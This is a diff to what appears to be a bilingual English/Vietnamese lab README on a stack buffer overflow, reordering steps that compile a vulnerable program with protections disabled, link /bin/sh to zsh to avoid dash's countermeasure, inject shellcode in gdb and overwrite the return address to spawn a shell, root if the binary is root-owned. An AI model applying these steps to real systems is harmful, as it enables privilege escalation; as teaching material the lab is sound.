@@ -20,27 +20,28 @@ or run this script to generate shellcode binary file:<br>
 `$> gcc vuln.c -o vuln.out -fno-stack-protector -z execstack`<br>
 7. Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04:<br>
 `$> sudo ln -sf /bin/zsh /bin/sh`<br>
-9. Load vuln.out in gdb <br>
+**Conducting the attack**
+1. Load vuln.out in gdb <br>
 (Nạp vuln.out trong gdb)<br>
 `$> gdb vuln.out`<br>
-8. Set break point after strcpy instruction <br>
+2. Set break point after strcpy instruction <br>
 (Đặt điểm dừng chương trình sau lệnh strcpy)<br>
-Run program in gdb with injecting argument
-(Khởi chạy chương trình trong gdb, chèn chuỗi hex của shellcode trên dòng lệnh)
-(gdb-peda)r $(python -c "print(<injecting shellcode along with padding bytes>+'\xff\xff\xff\xff')")
-Watch the stack memory from esp (stacktop):
-(Quan sát bộ nhớ stack từ esp)
-(gdb-peda) x/80xb $esp
-Identify the return address while watching out the stack, then replace \xff\xff\xff\xff with value of esp
-(Xác định vị trí của địa chỉ trả về trong stack, thay thế \xff\xff\xff\xff với địa chỉ của esp)
-set *<address of return address> = <address of esp>
-Continue execute program, you should now in the new bash shell:
-(Thực thi tiếp chương trình, sẽ thấy xuất hiện dấu nhắc shell --> thực thi được shellcode)
-(gdb-peda) continue
-$_ <-- you are in the new bash. If vuln.out is set with root as the owner, you will be root in the new shell!  
-Type exit to be back in gdb
-$exit
-(gdb-peda)
+3. Run program in gdb with injecting argument <br>
+(Khởi chạy chương trình trong gdb, chèn chuỗi hex của shellcode trên dòng lệnh)<br>
+`(gdb-peda)r $(python -c "print(<injecting shellcode along with padding bytes>+'\xff\xff\xff\xff')")`<br>
+4. Watch the stack memory from esp (stack top):<br>
+(Quan sát bộ nhớ stack từ esp)<br>
+`(gdb-peda) x/80xb $esp`
+5. Identify the return address while watching out the stack, then replace `\xff\xff\xff\xff` with value of esp<br>
+(Xác định vị trí của địa chỉ trả về trong stack, thay thế `\xff\xff\xff\xff` với địa chỉ của esp)<br>
+`set *<address of return address> = <address of esp>`<br>
+6. Continue execute program, you should now in the new bash shell:<br>
+(Thực thi tiếp chương trình, sẽ thấy xuất hiện dấu nhắc shell --> thực thi được shellcode)<br>
+`(gdb-peda) continue`<br>
+`$_` <-- you are in the new bash. If vuln.out is set with root as the owner, you will be root in the new shell!  <br>
+7. Return to gdb<br>
+`$>exit`<br>
+`(gdb-peda)`
 
 
 
